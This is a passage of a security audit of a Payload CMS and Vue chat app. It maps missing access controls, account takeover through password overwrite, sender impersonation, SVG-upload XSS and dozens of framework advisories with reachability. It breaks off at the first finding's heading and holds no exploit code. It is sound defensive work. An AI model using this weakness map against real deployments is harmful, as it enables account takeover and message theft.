# Security Audit — "Aplikasi Chat Sederhana" (Payload CMS + Vue)

**Audit date:** 2026-10-29
**Repository:** `vue-chatapps-public` @ commit `1b33cc7` ("update dockerfile"), branch `main`
**Auditor scope:** the supplied repository and its local development environment
**Verdict:** **NO-GO** for public exposure until the Stage A blockers in [`remediation-plan.md`](./remediation-plan.md) are closed.

> ## Remediation status (updated 2026-10-30)
>
> **All findings are now closed or reduced to non-blocking residuals.** The body of this
> document records the repository **as audited on 2026-10-29**; each finding now carries a
> "Remediation applied" note and a current **Status**.
>
> - **Closed:** SEC-001, 002, 003, 004, 005, 006, 007, 008, 009, 010, 011, 012, 013, 014, 015, 016, 018.
> - **Partially remediated (non-blocking residuals):** SEC-017 (DB-backed `/api/health`,
>   healthchecks and log rotation added; off-host shipping, alerting, backups and CI deferred).
> - **Stage B, now implemented (2026-10-30):** SEC-015 route guards, SEC-018 `roles` field,
>   SEC-009 residual polling discipline/pagination, SEC-010 lifecycle (verification removed,
>   password-reset flow added), plus a DB-backed `GET /api/health`.
> - **Deferred:** backups/rehearsed restore (B5), CI (B6), off-host log shipping/alerting (B4).
>
> The regression suite is green: **73 `it` blocks (79 test cases) across 8 files** against a
> disposable database, `tsc --noEmit` clean, both applications build. Items that can only be
> confirmed on the target VPS (TLS headers, live CORS/CSRF behaviour, closed 27017, image-layer
> inspection, a rehearsed backup restore) are explicitly marked **unverified** in their sections.
>
> The verdict below remains the correct historical assessment of commit `1b33cc7`. A revised
> verdict is gated on the VPS verification checklist in [`deployment-guide.md`](./deployment-guide.md).

---

## 1. Executive summary

The application is a functional two-tier chat system with **no authorization model**. Every collection access function in the codebase returns a constant (`() => true` or Payload's default presence check). The result is that:

- **Every direct message and every channel message in the system is readable by any logged-in user**, and channel messages are readable by *anonymous* visitors.
- **Any logged-in user can take over any other user's account** by writing a new password to their `penggunas` document, because `Penggunas.access.update` is `() => true` and Payload 3.70.0 does not enforce field-level `password` update restrictions on the server (GHSA-fx49-4h83-wjv9).
- **Any logged-in user can impersonate any other user** in a message, because the sender identity is read from the request body rather than from the session.
- **Any anonymous visitor can upload files** that are then served from the API's own origin — an SVG upload becomes same-origin stored XSS (GHSA-2pwp-2369-8fg3, GHSA-9qpg-3cf8-w33x).

Independently of the application logic, the **framework itself is 20+ advisories (Next.js) and 25 advisories (Payload) behind current**, including two unauthenticated remote-code-execution issues in Next.js's Image Optimization API and an unauthenticated RCE in Payload's first-user registration flow.

No credential or secret was found committed to the repository or its Git history, and the frontend has no XSS sinks (`v-html`, `innerHTML`, `eval`) and stores no tokens in browser storage. Those parts of the design are sound.

**Bottom line:** the chat application's confidentiality model does not exist. This is not a hardening gap — it is the absence of the security boundary the product is about. It must be fixed before the app is reachable from the internet.

### Findings at a glance

| ID | Title | Severity | Confidence | Status | Requires auth |
|---|---|---|---|---|---|
| SEC-001 | Password takeover of any application account via unrestricted `penggunas` update | **Critical** | High | **Remediated** (2026-10-29) | No |
| SEC-002 | Direct messages readable by any authenticated user (IDOR) | **Critical** | High | **Remediated** (2026-10-29) | Yes |
| SEC-003 | Channel messages and channels readable/mutable by anonymous visitors | **Critical** | High | **Remediated** (2026-10-29) | No |
| SEC-004 | Unrestricted file upload enabling same-origin stored XSS | **High** | High | **Remediated** (2026-10-29) | No |
| SEC-005 | Sender impersonation — message sender taken from the request body | **High** | High | **Remediated** (2026-10-29) | Yes |
| SEC-006 | Next.js 15.5.9 — 20+ outstanding advisories incl. 2x unauthenticated RCE | **High** | High | **Remediated** (2026-10-29) | No |
| SEC-007 | Payload 3.70.0 — 25 outstanding advisories incl. unauthenticated RCE | **High** | High | **Remediated** (2026-10-29) | No |
| SEC-008 | Plain-HTTP hardcoded CORS/CSRF origin; no `serverURL`; `Secure` cookie flag off | **Medium** | High | **Remediated** (2026-10-30) | No |
| SEC-009 | No rate limiting on any endpoint | **Medium** | High | **Remediated** (2026-10-30) | No |
| SEC-010 | Open self-registration; no email verification; weak password policy | **Medium** | High | **Remediated** (2026-10-30) | No |
| SEC-011 | Outdated transitive dependencies with reachable advisories (mongoose, sharp, qs) | **Medium** | Medium | **Remediated** (2026-10-29) | Varies |
| SEC-012 | Deployment artefacts insecure by default (Mongo published, no `.dockerignore`, HTTP-only nginx) | **Medium** | High | **Remediated** (2026-10-30) | No |
| SEC-013 | Unauthenticated enumeration of all registered users (email disclosure) | **Medium** | High | **Remediated** (2026-10-30; residual accepted) | No |
| SEC-014 | No CSP, HSTS, `X-Content-Type-Options` or `frame-ancestors`; incomplete CSRF posture | **Medium** | High | **Remediated** (2026-10-30) | No |
| SEC-015 | Frontend has no route guards — protected views render unauthenticated | **Low** | High | **Remediated** (2026-10-30, B2) | No |
| SEC-016 | Unused dependencies (`dompurify`, `monaco-editor`) and dead code enlarge surface | **Low** | High | **Remediated** (2026-10-29) | No |
| SEC-017 | No CI/CD, no backup procedure, no monitoring, no health check | **Low** | High | Partially remediated (2026-10-30) — Stage B | No |
| SEC-018 | `users` (admin) collection has no roles — every admin sees everything | **Low** | High | **Remediated** (2026-10-30) | Yes |

---

## 2. Scope

### In scope
- `payload-be/` — Payload CMS backend, its collections, config, Dockerfile, compose file, tests.
- `vue-frontend/` — Vue SPA, its router, components, Vite config, Dockerfile, nginx vhost.
- Full Git history of the repository (`git log -p --all`, 6 commits) for secret exposure.
- The committed `package-lock.json` files (authoritative for installed versions).
- The upstream Payload 3.70.0 source at tag `v3.70.0` for framework-behaviour verification.

### Explicitly out of scope
- The target VPS itself (firewall, TLS certificates, SSH configuration, MongoDB authentication, backups, OS patching). These are marked **Not verified** and require direct inspection — see [`deployment-guide.md`](./deployment-guide.md).
- Any live or third-party system. No external scanning, no port scanning of public IPs, no credential attacks, no DoS testing, no exploit execution.
- Any production database or credential. No production URI was read or used.

### Constraints observed during this audit
- No application source was modified. The only files created are the documents under `docs/`.
- No dependency was installed, upgraded, downgraded or removed. No lockfile or manifest was touched.
- No database migration was run and no schema was altered.
- No environment variable or configuration file was changed.
- No Git history, branch, remote or repository setting was modified.
- No file was deleted. No deployment script was executed. No publicly reachable service was started.
- No secret values are reproduced in this document; all are shown as `<REDACTED>`.

---

## 3. Methodology

### 3.1 Process

1. **Inventory** — enumerated every tracked file (`git ls-files`, 95 files) and every present-but-untracked file, classifying each as application source, generated file, build artefact or configuration.
2. **Architecture reconstruction** — read every file under `payload-be/src/collections/`, `payload-be/src/app/`, `vue-frontend/src/`, both `Dockerfile`s, `docker-compose.yml`, `default.conf`, and all config and manifest files.
3. **Framework-behaviour verification** — rather than assuming Payload's semantics, the **actual Payload 3.70.0 source** was fetched from `raw.githubusercontent.com/payloadcms/payload/v3.70.0` and read to confirm: the default access function, the collection-config sanitisation defaults, auth defaults (cookie flags, token expiry, lockout), the password-hash routine, the password-update code path in `collections/operations/utilities/update.ts`, the upload pipeline (`checkFileRestrictions`, `mimeTypeValidator`, `getSafeFileName`), the CORS/CSRF header logic, and the REST/GraphQL route wiring.
4. **Dependency audit** — versions read from the committed lockfiles (not the declared ranges). Queried the **OSV.dev** API for every direct and security-relevant transitive dependency, then pulled the affected version ranges, fix versions, preconditions and CVSS scores for each matching advisory from the OSV record.
5. **Secret scanning** — `git log --all --pretty=format: --name-only` to enumerate every path that ever existed, then `git log -p --all -S ...` across all revisions for credential-bearing keys. Only `.env.example` (placeholders) and `test.env` (containing only `NODE_OPTIONS`) were ever committed.
6. **Manual threat modelling** — trust boundaries, IDOR/BOLA/BFLA analysis per collection and per operation, and frontend/backend trust mapping.
7. **Documented test scenarios** — designed in [`remediation-plan.md`](./remediation-plan.md) section 6 for execution once a disposable environment is authorised.

### 3.2 Tools run, with versions and outcomes

| Command / tool | Version | Result |
|---|---|---|
| `git log --oneline --all`, `git ls-files`, `git log -p --all` | git (system) | 6 commits, 95 tracked files, 1 branch (`main`), no CI config |
| `node -v` / `npm -v` | v22.18.0 / 10.9.3 | audit host runtime |
| `npm audit --json` (in `payload-be/`) | npm 10.9.3 | **Failed** — registry returned HTTP 400 `Invalid package tree, run npm install to rebuild your package-lock.json`. No lockfile was modified to force a re-run. |
| `npm audit --package-lock-only --json` | npm 10.9.3 | **Failed** — "This command requires an existing lockfile" |
| OSV.dev `POST /v1/querybatch` | api.osv.dev | **Succeeded** — primary dependency-advisory source used throughout section 5 |
| OSV.dev `GET /v1/vulns/{id}` | api.osv.dev | **Succeeded** — 60+ advisories retrieved with affected ranges, fix versions and CVSS vectors |
| `npm view payload versions` / `dist-tags` | npm registry | `latest = 3.92.1`, `canary = 4.0.0-canary.39` |
| HTTP fetch of Payload source at `v3.70.0` | — | **Succeeded** — used for all framework-behaviour claims |
| `docker --version` | 28.5.1 | available; **not used** in this phase (no environment was started) |
| `pnpm --version` | — | **Not installed** on the audit host |

### 3.3 Limitations of this audit

- **`npm audit` could not be executed.** The registry rejected the committed lockfile as an invalid package tree. The dependency analysis therefore rests on OSV.dev, which is the authoritative mirror of the GitHub Advisory Database and the npm advisory feed. This is a *tooling* limitation, not a coverage gap for the packages examined, but it does mean npm-specific advisory metadata was not consulted.
- **No runtime verification was performed.** The application was not started, no request was issued, and no database was touched. Every finding marked *Confirmed* is confirmed **by static analysis against the exact framework source**, not by exploitation. Findings that require execution are listed as test cases in the remediation plan with their prerequisites.
- **The VPS was not inspected.** TLS configuration, firewall rules, MongoDB authentication, file permissions, backups, and OS patch state are all **Not verified**.
- **The real `.env` files were never read.** Only `.env.example` was inspected. Whether `PAYLOAD_SECRET` and `DATABASE_URI` are set correctly in the deployment environment is unknown, so secret rotation is recommended unconditionally.
- **The Admin Panel's runtime behaviour** was inferred from source, not exercised.
- **GraphQL was reviewed as a surface, not exercised.** Every collection-level finding applies identically to GraphQL because both routes are wired to the same Payload operations, but no GraphQL query was run.

---

## 4. Architecture and trust boundaries

```
+----------------------------------------------------------------------+
| ANONYMOUS VISITOR            | no cookie, no req.user                 |
+------------------------------+---------------------------------------+
| TRUST BOUNDARY 1 -- Authentication (Payload local-jwt + session)      |
+----------------------------------------------------------------------+
| AUTHENTICATED USER (penggunas)  | req.user = { id, collection }      |
+----------------------------------------------------------------------+
| TRUST BOUNDARY 2 -- Collection access functions  <== FAILS HERE      |
|   channels/messages/memberships/media -> () => true                   |
|   penggunas.update -> () => true                                     |
+----------------------------------------------------------------------+
| TRUST BOUNDARY 3 -- Document ownership / membership  <== DOES NOT     |
|   EXIST. No hook, no field-level access, no where-clause injection.  |
+----------------------------------------------------------------------+
| TRUST BOUNDARY 4 -- Client-asserted identity  <== SERVER TRUSTS IT   |
|   sender_id, Sender, pengguna_id, owner are all taken from the body  |
+----------------------------------------------------------------------+
```

**Key observation.** The application has exactly **one** functioning security boundary — the authentication check in Payload's `defaultAccess` (`Boolean(req.user)`). Everything downstream of it assumes a trusted caller. Because the collection configs override `defaultAccess` with `() => true` in most places, even that boundary is not enforced for reads.

Payload's own documentation states the rule this application breaks:

> "Access Control functions are executed before any changes are made and before any operations are completed. This allows you to determine if the user has the necessary permissions before fulfilling the request."
> -- <https://payloadcms.com/docs/access-control/overview>

Payload's default access control:

```js
// packages/payload/src/auth/defaultAccess.js
const defaultAccess = ({ req: { user } }) => Boolean(user)
```

Every operation in this application either overrides that with `() => true`, or inherits it — and inheriting it means "logged in", **not** "entitled to this specific document".

### Data model and access matrix

| Collection | create | read | update | delete | Ownership check |
|---|---|---|---|---|---|
| `users` | default | default | default | default | none |
| `penggunas` | **`() => true`** | **`() => true`** | **`() => true`** | default | none |
| `media` | default | **`() => true`** | default | default | none |
| `chats` | **`() => true`** | default | default | default | none |
| `channels` | **`() => true`** | **`() => true`** | **`() => true`** | **`() => true`** | none |
| `memberships` | **`() => true`** | **`() => true`** | default | **`() => true`** | none |
| `messages` | **`() => true`** | **`() => true`** | default | default | none |

`default` = Payload's `Boolean(req.user)`.

---

## 5. Dependency and legacy-technology audit

### 5.1 Runtime stack

| Component | Required | Detected / committed | Assessment |
|---|---|---|---|
| Node.js (backend) | `^18.20.2 \|\| >=20.9.0` | Node 18 EOL (2025-04-30); Node 20 EOL (2026-04) | **`node:18-alpine` in `docker-compose.yml:5` is EOL.** Move to Node 22 LTS. |
| Node.js (frontend) | `^20.19.0 \|\| >=22.12.0` | — | Dockerfiles use `node:20-alpine` — Node 20 reaches EOL April 2026. Move to Node 22. |
| Package manager | pnpm declared | **npm lockfile committed** | Inconsistency; `pnpm install` ignores `package-lock.json`. `npm run test:e2e` and `npm test` invoke `pnpm` internally. |
| Vue | `^3.5.22` | 3.5.22 | Current. No OSV records. |
| vue-router | `^4.6.3` | 4.6.3 | Current. No OSV records. |
| Pinia | `^3.0.3` | 3.0.3 | Current. Unused (demo store only). |
| Vite | `^7.1.11` | 7.1.12 | 7 advisories, all **dev-server only** — not reachable in the production build. |
| Payload CMS | `3.70.0` | 3.70.0 | **25 advisories outstanding.** Latest is 3.92.1. |
| Next.js | `15.5.9` | 15.5.9 | **20+ advisories outstanding**, incl. 2x unauthenticated RCE. Fixed in 15.5.28 / 16.4.1. |
| mongoose | transitive | 8.15.1 | 2 advisories (fixed 8.22.1 / 8.24.1). |
| sharp | `0.34.2` | 0.34.2 | 3 advisories (fixed 0.35.0 / 0.35.4 / 0.35.5). |
| qs | `^6.14.0` | 6.14.0 | 4 advisories (fixed 6.14.1 / 6.14.2 / 6.15.2 / 6.16.1). |
| DOMPurify | `^3.3.1` | 3.3.1 | 4 advisories — **but the package is never imported**, so unreachable. Remove it. |
| monaco-editor | `^0.55.1` | 0.55.1 | Unused. Remove. |
| axios | — | **not installed** | The frontend uses raw `fetch`. |
| graphql | `^16.8.1` | 16.12.0 | No OSV records. |
| react / react-dom | `^19.2.3` | — | Required by Payload 3.70's Admin Panel. |

> **Current state (2026-10-30, after task A3).** `payload` and all `@payloadcms/*` are `3.92.1`
> (the `richtext-lexical` entry declares `^3.78.0` and resolves to 3.92.1), `next` is `16.4.3`,
> `react`/`react-dom` are `19.2.6`, `sharp` is `0.35.5`, `mongoose` is `8.24.1` (transitive) and
> the frontend `qs` is `6.17.1`. `dompurify`, `monaco-editor` and `yjs` were removed. The backend
> `engines` now require `node ^22.23.4 || >=24.22.1` and `npm >=10`, both Dockerfiles use
> `node:22-alpine`, and `docker-compose.yml` runs `npm ci` (the `pnpm install` was removed). An
> `overrides` block now pins `happy-dom` and `graphql-scalars`.

### 5.2 Next.js advisories affecting `next@15.5.9` (33 matched)

Grouped by impact. **All are reachable** unless noted: Next.js 15.5.9 is the App Router version and this project uses the App Router.

| Advisory | Summary | CVSS 4.0 | Fixed in | Reachable here? |
|---|---|---|---|---|
| GHSA-2464-fhr4-w9xw | **Unauthenticated RCE in Image Optimization API (SVG)** | `AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` | 15.5.28 | Yes — `/_next/image` is exposed by the App Router. `sharp` is loaded. |
| GHSA-2xp9-vwfh-vxw4 | **Unauthenticated RCE in Image Optimization API (AVIF)** | `AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` | 15.5.24 | Yes — same route, AVIF input. |
| GHSA-p293-qw3h-jr36 | Unauthenticated RCE on Windows-hosted servers | `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` | 15.5.24 | Only if deployed on Windows — the deployment target is Linux. **Not applicable to target.** |
| GHSA-89xv-2m56-2m9x | SSRF in Server Actions on custom servers | `AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N` | 15.5.21 | Yes — Payload's Admin Panel registers Server Functions (`handleServerFunctions`). |
| GHSA-p9j2-gv94-2wf4 | SSRF in rewrites via attacker-controlled destination | `AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N` | 15.5.21 | Conditional — no `rewrites()` configured, but the rewrite machinery is present. |
| GHSA-c4j6-fc7j-m34r | SSRF in applications using WebSocket upgrades | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | 15.5.16 | Conditional — no WebSocket route configured. |
| GHSA-267c-6grr-h53f | Middleware/Proxy bypass via segment-prefetch routes | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | 15.5.16 | Yes — the App Router's prefetch routes exist. |
| GHSA-26hh-7cqf-hhc6 | Middleware/Proxy bypass (incomplete fix) | — | 15.5.18 | Yes |
| GHSA-36qx-fr4f-26g5 | Middleware/Proxy bypass in Pages Router with i18n | — | 15.5.16 | No — Pages Router not used. |
| GHSA-492v-c6pp-mqqv | Middleware/Proxy bypass via dynamic route parameter injection | — | 15.5.16 | Yes — `[[...segments]]` catch-all route in use. |
| GHSA-955p-x3mx-jcvp | Unauthenticated disclosure of internal Server Function endpoints | `AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N` | 15.5.21 | Yes — Server Functions in use. |
| GHSA-8h8q-6873-q5fj | DoS with Server Components | `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | 15.5.16 | Yes |
| GHSA-h25m-26qc-wcjf | DoS via RSC deserialization | `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | 15.5.10 | Yes |
| GHSA-q4gf-8mx6-v5v3 | DoS with Server Components | — | 15.5.15 | Yes |
| GHSA-m99w-x7hq-7vfj | DoS in App Router using Server Actions | — | 15.5.21 | Yes |
| GHSA-mg66-mrh9-m8jx | DoS via connection exhaustion (Cache Components) | — | 15.5.16 | Conditional |
| GHSA-p3m5-59mp-jv5r | DoS in App Router using Server Actions | — | 15.5.28 | Yes |
| GHSA-4c39-4ccg-62r3 | Unbounded Server Action payload in Edge runtime | — | 15.5.21 | Conditional — Edge runtime not used. |
| GHSA-h64f-5h5j-jqjh | DoS in the Image Optimization API | — | 15.5.16 | Yes |
| GHSA-q8wf-6r8g-63ch | DoS in the Image Optimization API using SVGs | — | 15.5.21 | Yes |
| GHSA-9g9p-9gw9-jx7f | DoS via Image Optimizer `remotePatterns` | — | 15.5.10 | Conditional |
| GHSA-3x4c-7xq6-9pq8 | Unbounded `next/image` disk-cache growth -> disk exhaustion | — | 15.5.14 | Yes — `sharp` enabled, image route active. |
| GHSA-4633-3j49-mh5q | Cache confusion with invalid UTF-8 bodies | — | 15.5.21 | Yes |
| GHSA-68g3-v927-f742 | Cache confusion of response bodies with bodies | — | 15.5.21 | Yes |
| GHSA-vfv6-92ff-j949 | Cache poisoning via RSC cache-busting collisions | — | 15.5.16 | Yes |
| GHSA-wfc6-r584-vfw7 | Cache poisoning in RSC responses | — | 15.5.16 | Yes |
| GHSA-mcj8-r9mp-w47p | Cache poisoning in SSG/ISR -> cross-user content substitution | — | 15.5.27 | Yes |
| GHSA-4jqv-mc3x-m676 | Cache poisoning of SSG/ISR in self-hosted apps | — | 15.5.27 | Yes |
| GHSA-3g8h-86w9-wvmq | Middleware/Proxy redirects can be cache-poisoned | — | 15.5.16 | Yes |
| GHSA-ggv3-7p47-pfv8 | HTTP request smuggling in rewrites | — | 15.5.13 | Conditional |
| GHSA-ffhc-5mcf-pf4q | XSS in App Router applications using CSP nonces | — | 15.5.16 | Conditional — no CSP configured today. |
| GHSA-gx5p-jg67-6x7h | XSS in `beforeInteractive` scripts with untrusted input | — | 15.5.16 | Conditional |

**Assessment.** Two of these are unauthenticated remote code execution with `PR:N` and `VC:H/VI:H/VA:H`. On a publicly reachable Next.js App Router deployment this is a Critical-severity framework risk independent of anything the application does. The fix is a version bump to >= 15.5.28 (or 16.4.1), which is a patch/minor within the same major — low compatibility risk for a Payload 3.x project (Payload pins Next.js 15.x).

### 5.3 Payload CMS advisories affecting `payload@3.70.0` (25 matched)

| Advisory | Summary | CVSS | Fixed in | Reachable here? |
|---|---|---|---|---|
| GHSA-97rh-rhh2-7vjv | **RCE through first-register** | `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` | 3.90.0 | **Yes** — `penggunas` is an auth collection with a public `/api/penggunas/first-register` endpoint. Reachable whenever no `penggunas` document exists. |
| GHSA-f7hx-52q9-hcrf | Unauthorized update to collection documents | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | 3.90.0 | Conditional — requires `orderable: true`, which is not configured. **Not reachable as configured.** |
| GHSA-66wr-7vmr-p5jq | Auth token field-handling issue (reserved claim injection) | `AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H` | 3.90.0 | Conditional — requires a field mapped to a reserved auth claim. Not configured. Low likelihood. |
| GHSA-2g7p-5934-q4w7 | ReDoS in multipart Content-Type validation | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H` | 3.90.0 | **Yes** — the `media` upload endpoint accepts multipart bodies, and `media` is open to any authenticated user. |
| GHSA-7c34-32v3-j575 | Relationship-query authorization bypass | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N` | 3.90.0 | **Yes** — `messages.Channel` -> `channels`, `chats.sender_id` -> `penggunas`, `memberships.channel_id` -> `channels` are all relationships into collections whose read access is unrestricted. |
| GHSA-fpww-c55p-cjv6 | Polymorphic join queries disclose hidden fields | `AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N` | 3.90.0 | Conditional — no `join` fields configured. Low likelihood. |
| GHSA-9g87-32v6-3c2r | Sort queries expose protected field information | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N` | 3.88.0 | **Yes** — `sort=createdAt` is used by the SPA and `hash`/`salt` are hidden but sortable. |
| GHSA-9qpg-3cf8-w33x | Uploaded XML can execute same-origin JavaScript | `AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H` | 3.90.0 | **Yes** — `media` accepts uploads, `upload.mimeTypes` is unset, XML is not in the restricted-extension list. |
| GHSA-2pwp-2369-8fg3 | Bypassed sanitization of uploaded SVGs | `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` | 3.90.0 | **Yes** — same reachability as above; SVG is not in the restricted list. |
| GHSA-6r7f-q7f5-wpx8 | Authenticated SSRF via upload functionality | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` | 3.79.1 | **Yes** — `media` has `upload: true` and any authenticated user may create documents in it. |
| GHSA-hhfx-5x8j-f5f6 | SSRF in External File URL uploads | `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N` | 3.75.0 | Conditional — requires the `externalFile` upload option, not configured. |
| GHSA-pj5h-5q6c-3pfx | External upload trust validation issue | `AV:N/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:N` | 3.90.0 | Conditional — as above. |
| GHSA-p223-2wr2-j562 | Incomplete validation in the upload file lifecycle | `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` | 3.90.0 | **Yes** — the upload path is reachable. |
| GHSA-hp5w-3hxx-vmwf | Pre-auth account takeover via parameter injection in password recovery | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` | 3.79.1 | **Yes** — `/api/penggunas/forgot-password` is public on an auth collection. |
| GHSA-p6mr-xf3r-ghq4 | CSRF protection bypass in the authentication flow | `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L` | 3.79.1 | **Yes** — cookie auth is in use. The advisory's precondition (`serverURL` configured) does not currently hold, which is the *only* reason this is not directly exploitable today. |
| GHSA-v5gf-vpjc-pc7w | Unauthenticated account-lockout DoS | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L` | 3.90.0 | **Yes** — `penggunas` uses local auth with `maxLoginAttempts: 5`; any attacker who knows an email can lock that account. |
| GHSA-jg8r-5jh2-v2xj | Default account-unlock access lets any authenticated user reset others' lockouts | `AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N` | **not fixed in 3.x** | **Yes** — `/api/penggunas/unlock` is available to any authenticated user. |
| GHSA-q6mq-ch85-c8mm | Password hashes use insufficient PBKDF2 iterations | `AV:N/AC:L/AT:P/PR:H/UI:N/VC:H/VI:L/VA:N` | 3.90.0 | **Yes** — Payload 3.70.0 uses 25 000 iterations (`generatePasswordSaltHash.ts`); the fix raises it. Relevant only if the database leaks. |
| GHSA-fx49-4h83-wjv9 | Field-level password update restrictions not enforced | `AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N` | 3.90.0 | **Yes — this is the amplifier for SEC-001.** |
| GHSA-xgv3-crq2-6f69 | Token refresh / password reset responses may expose restricted user fields | `AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N` | 3.90.0 | **Yes** — `penggunas` fields have no field-level access control. |
| GHSA-238x-w2j9-gwwr | API key disclosure through ordinary document reads | `AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H` | 3.90.0 | No — `useAPIKey` is not enabled. |
| GHSA-w84c-53h3-mc2g | Untrusted redirect URL parameter exploit | `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | 3.88.0 | Conditional — requires a user-controlled redirect in the auth flow; the SPA does not use one. |
| GHSA-7xxh-373w-35vg | SQL Injection via Query Handling | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` | 3.79.1 | **No** — MongoDB adapter, not SQL. |
| GHSA-v49j-62m6-pgrr | SQL Injection in SQLite and Postgres | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | 3.88.0 | **No** — MongoDB adapter. |

**Upgrade path.** `3.70.0 -> 3.92.1` is a **minor-version upgrade within Payload 3.x**, not a major migration. This project already uses the Payload 3.x collection-config API and already satisfies the React 19 requirement (`react ^19.2.3`). **Do not** jump to `4.0.0-canary` as part of this remediation — it changes the config API and is not required to close any of these advisories.

### 5.4 Other dependency advisories

| Package | Installed | Advisory | Fixed in | Reachability |
|---|---|---|---|---|
| mongoose | 8.15.1 | GHSA-664h-wqgq-64gw — prototype pollution in update casting via `__proto__`-prefixed dotted path | 8.24.1 | **Conditional** — requires an update path with an attacker-controlled dotted path. **Needs runtime testing.** |
| mongoose | 8.15.1 | GHSA-wpg9-53fq-2r8h — improper sanitization of `$nor` allows NoSQL injection | 8.22.1 | **Conditional** — requires `$nor` in a query. Payload's `where` parser does support `$or`/`$and`; `$nor` support should be tested. |
| sharp | 0.34.2 | GHSA-f88m-g3jw-g9cj — libvips CVEs | 0.35.0 | **Yes** — `sharp` is loaded in `payload.config.ts` and processes uploads. |
| sharp | 0.34.2 | GHSA-rgj7-g3m4-5g8c — libheif vulnerabilities | 0.35.4 | **Yes** — HEIC/HEIF decoding path. |
| sharp | 0.34.2 | GHSA-wq5f-xc86-pv6w — librsvg CVE | 0.35.5 | **Yes** — SVG rendering path. |
| qs | 6.14.0 | GHSA-6rw7-vpxm-498p — `arrayLimit` bypass in bracket notation -> memory exhaustion | 6.14.1 | **Yes** — the SPA calls `qs.stringify` on partly attacker-influenced structures; low practical impact (client-side only). |
| qs | 6.14.0 | GHSA-w7fw-mjwx-w883 — `arrayLimit` bypass in comma parsing -> DoS | 6.14.2 | Yes (client-side) |
| qs | 6.14.0 | GHSA-q8mj-m7cp-5q26 — `qs.stringify` TypeError on null/undefined in comma format | 6.15.2 | Yes (client-side) |
| qs | 6.14.0 | GHSA-4mjr-xmp4-gh2g — DoS via attacker-controlled `isBuffer` | 6.16.0 | Yes (client-side) |
| DOMPurify | 3.3.1 | GHSA-39q2-94rc-95cp, GHSA-r47g-fvhr-h676, GHSA-v9jr-rg53-9pgp, GHSA-mrv2-3pqr-j5jr | 3.4.0 / 3.4.6 / 3.4.0 / 3.4.17 | **No — the package is never imported.** Remove it. |
| Vite | 7.1.12 | GHSA-4w7w-66w2-5vf9, GHSA-587h-7wmj-h5pm, GHSA-698v-4r3x-3vcv, GHSA-9jrq-w75r-8gcw, GHSA-fx2h-pf6j-xcff, GHSA-p9ff-h696-f583, GHSA-r825-w8mm-5pxw, GHSA-rq7h-c2jc-7f22, GHSA-v2wj-q39q-566r, GHSA-v6wh-96g9-6wx3 | 7.3.2 / 7.3.5 / 7.3.7 / 8.x | **No** — dev-server only. The Vite dev server must never be exposed publicly. |
| monaco-editor | 0.55.1 | none | — | Unused. Remove. |
| graphql | 16.12.0 | none | — | — |

### 5.5 Package-hygiene observations

> **Current state (2026-10-30).** Most of the hygiene observations below were addressed in Stage A;
> the as-audited text is retained and annotated inline.

- **[Resolved]** ~~**Package-manager mismatch**: `package.json` `engines` declares pnpm; the committed lockfile is npm's. `docker-compose.yml:12` runs `pnpm install`~~ — the backend `engines` now require `node`/`npm`, and `docker-compose.yml` runs `npm ci`, honouring the lockfile.
- **`.npmrc` sets `legacy-peer-deps=true`** — a blanket suppression of peer-dependency conflicts. It can mask real incompatibilities; it was required for the React 19 upgrade.
- **`.yarnrc` sets `--install.ignore-engines true`** — a third package manager's config file is present although neither pnpm nor yarn is actually used. It should be removed.
- **[Resolved]** ~~**No `overrides`/`resolutions` block** exists~~ — `package.json` now carries an `overrides` block (`happy-dom`, `graphql-scalars`). Transitive advisories (mongoose, sharp, qs) were nonetheless fixed by the direct dependency bump in A3.
- **`sharp` was pinned exactly** (`0.34.2`, no caret) — good practice for a native module, but it means it would not receive 0.35.x security fixes automatically. It is now `0.35.5`.
- **[Resolved]** ~~**`@payloadcms/email-nodemailer` is installed but not configured.**~~ — the adapter is now wired via `src/config/email.ts` (`buildEmailAdapter()`) and drives the password-reset email (B1); it logs mail when `SMTP_*` is unset.
- **[Resolved]** The unused `dompurify`, `monaco-editor` and `yjs` dependencies were removed (SEC-016).

---

## 6. Findings

Severity follows the brief's scale. CVSS 4.0 vectors are quoted where the upstream advisory supplies one; application-logic findings are scored where a meaningful vector can be justified.

---

### [SEC-001] Password takeover of any application account via unrestricted `penggunas` update

